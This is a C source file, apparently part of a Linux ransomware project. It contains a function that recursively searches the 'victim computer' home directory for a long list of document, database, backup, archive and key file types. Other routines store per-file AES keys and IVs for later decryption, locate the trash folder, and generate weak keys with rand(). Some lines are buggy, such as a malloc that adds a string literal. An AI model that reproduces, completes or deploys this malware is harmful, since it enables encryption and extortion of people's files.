// find files and store in the list
#include"func.h"
#include"struct.h"
#include"crypto.h"
#include<string.h>
#include<time.h>
#include<stdlib.h>
#include<dirent.h>
#include<stdio.h>
#include<openssl/aes.h>
#include<openssl/evp.h>

/**
 * This function will find all files on the victim computer.
 * Starts from the start_path and to each file found, it's extension is verified
 * If the file is valid, then the path to the file is append to the files (List).
 * @param files -> type = List
 * @param start_path -> type =  char * (String)
 */
void find_files(List **files, char* start_path){

    char file_types[] = "doc docx xls xlsx ppt pptx pst ost msg eml vsd vsdx txt csv rtf wks wk1 pdf dwg onetoc2 snt jpeg jpg docb docm dot dotm dotx xlsm xlsb xlw xlt xlm xlc xltx xltm pptm pot pps ppsm ppsx ppam potx potm edb hwp 602 sxi sti sldx sldm sldm vdi vmdk vmx gpg aes ARC PAQ bz2 tbk bak tar tgz gz 7z rar zip backup iso vcd bmp png gif raw cgm tif tiff nef psd ai svg djvu m4u m3u mid wma flv 3g2 mkv 3gp mp4 mov avi asf mpeg vob mpg wmv fla swf wav mp3 sh class jar java rb asp php jsp brd sch dch dip pl vb vbs ps1 bat cmd js asm h pas cpp c cs suo sln ldf mdf ibd myi myd frm odb dbf db mdb accdb sql sqlitedb sqlite3 asc lay6 lay mml sxm otg odg uop std sxd otp odp wb2 slk dif stc sxc ots ods 3dm max 3ds uot stw sxw ott odt pem p12 csr crt key pfx der";
    DIR *dir;
    struct dirent *ent;
    char * ext;
    char cp[747];

    if((dir=opendir(start_path)) != NULL){

        while((ent = readdir(dir)) != NULL){

            strcpy(cp, file_types);
            if(ent->d_type == 8){ // it's a file

                char *path_to_file = (char *)malloc(strlen(start_path) + strlen(ent->d_name) + 2);
                strcpy(path_to_file, start_path);
                strcat(path_to_file, ent->d_name);
                ext = strtok(cp, " ");

                while(ext != NULL){

                    if(strcmp(get_filename_ext(path_to_file), ext) == 0){
                        append(files, path_to_file, NULL, NULL);
                        break;
                    }
                    ext = strtok(NULL, " ");
                }

            }else if(ent->d_type == 4){ // it's a directory

                if(!(strcmp(ent->d_name, "..") == 0 || strcmp(ent->d_name, ".") == 0)){

                    char *new_dir = ent->d_name;
                    char *full_path = (char*) malloc(strlen(start_path)+strlen(new_dir) + 2);
                    strcpy(full_path,start_path);
                    strcat(full_path,new_dir);
                    strcat(full_path,"/");
                    find_files(files, full_path);
                    free(full_path);

                }
            }
        }
    }
}

/**
 * This function will save all keys, iv's and path's from each successfull
 * encrypted file in the file named: "enc_files.gc" on the user's desktop.
 * This file will be used to decrypt.
 * @param l -> type = EncList
 */
void save_into_file_encrypted_list(List *l, char * start_path){
    FILE *f;
    char * new_file;
    int status;
    int tam;
    List aux;
    aux.info[0] = (char *)malloc(33);
    aux.info[1] = (char *)malloc(17);
    new_file = (char*)malloc(strlen(start_path) + "enc_files.gc" + 1);
    //strcpy(new_file, start_path);
    //strcat(new_file, "enc_files.gc");
    strcpy(new_file,"/home/tarcisio/Desktop/enc_files.gc");
    f = fopen(new_file, "wb");

    while(l != NULL){
        tam = strlen(l->info[2]);
        aux.info[2] = (char *)malloc(tam+1);
        strcpy(aux.info[0], l->info[0]);
        strcpy(aux.info[1], l->info[1]);
        strcpy(aux.info[2], l->info[2]);
        status = fwrite(&aux, sizeof(List), 1, f);
        memset(aux.info[0], 0, 33);
        memset(aux.info[1], 0, 17);
        memset(aux.info[2], 0, tam);
        l = l->prox;
    }
    free(new_file);
    fclose(f);
}

/**
 * This function will open the file "enc_files.gc" that contains the key, iv
 * and path from each successfull encrypted file on the machine
 * Is used to append to the list all the encrypted files.
 * This list will be used to decrypt the files.
 * @param l -> type = List
 */
void read_from_file_encrypted_files(List **l, char * start_path){
    FILE *f;
    List temp;
    int status;
    char *key, *iv, *path;

    char * new_file = "/home/tarcisio/Desktop/enc_files.gc";
    //strcat(start_path, "enc_files.gc");

    if(*l != NULL){
        destroy(l);

    }else if(*l == NULL){
        f = fopen(start_path, "rb");
        if(f != NULL){

            while(1){

                status = fread(&temp, sizeof(List), 1, f);
                if(status != 1){
                    if(feof(f)){
                        fclose(f);
                        return;
                    }
                }
                append(l, temp.info[2], temp.info[0], temp.info[1]);
            }

            fclose(f);
        }
    }
}

/**
 * This function will get the extension from the file path.
 * @param filename -> type = char * (String)
 * @return -> type = char * (String)
 */
const char *get_filename_ext(const char *filename) {

    const char *dot = strrchr(filename, '.');
    if(!dot || dot == filename) return "";
    return dot + 1;

}

/**
 * This function returns the start path from the computer
 * /home/ + active user/
 * @return -> type = char * (String)
 */
char * get_start_path(){
    char* start_path;
    int tam;
    char username[100];
    getlogin_r(username, 100);
    tam = strlen(username);
    start_path = (char *)malloc(9 + tam);
    memset(start_path, 0, 9 + tam);
    strcat(start_path, "/home/");
    strcat(start_path, username);
    strcat(start_path, "/");
    return start_path;
}

/**
 * This function get the thrash path
 * @param start_path
 * @return 
 */
char * get_trash_path(char * start_path){
    char *trash ;
    trash = (char *)malloc(strlen(start_path) + 21);
    memset(trash, 0, strlen(trash));
    strcpy(trash, start_path);
    strcat(trash , ".local/share/Trash/");
    return trash;
}

/**
 * This function will generate random string to be saved as key and iv.
 * @param length -> type = integer
 * @return -> type = char * (String)
 */
char* generate_key(int length){
    static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#@$%&(){};'?!";
    char *randomString;
    int key;
    randomString = malloc(sizeof(char) * (length +1));

    if (randomString) {
        for (int n = 0;n < length;n++) {
            key = rand() % (int)(sizeof(charset) -1);
            randomString[n] = charset[key];
        }

        randomString[length] = '\0';
    }


    return randomString;
}
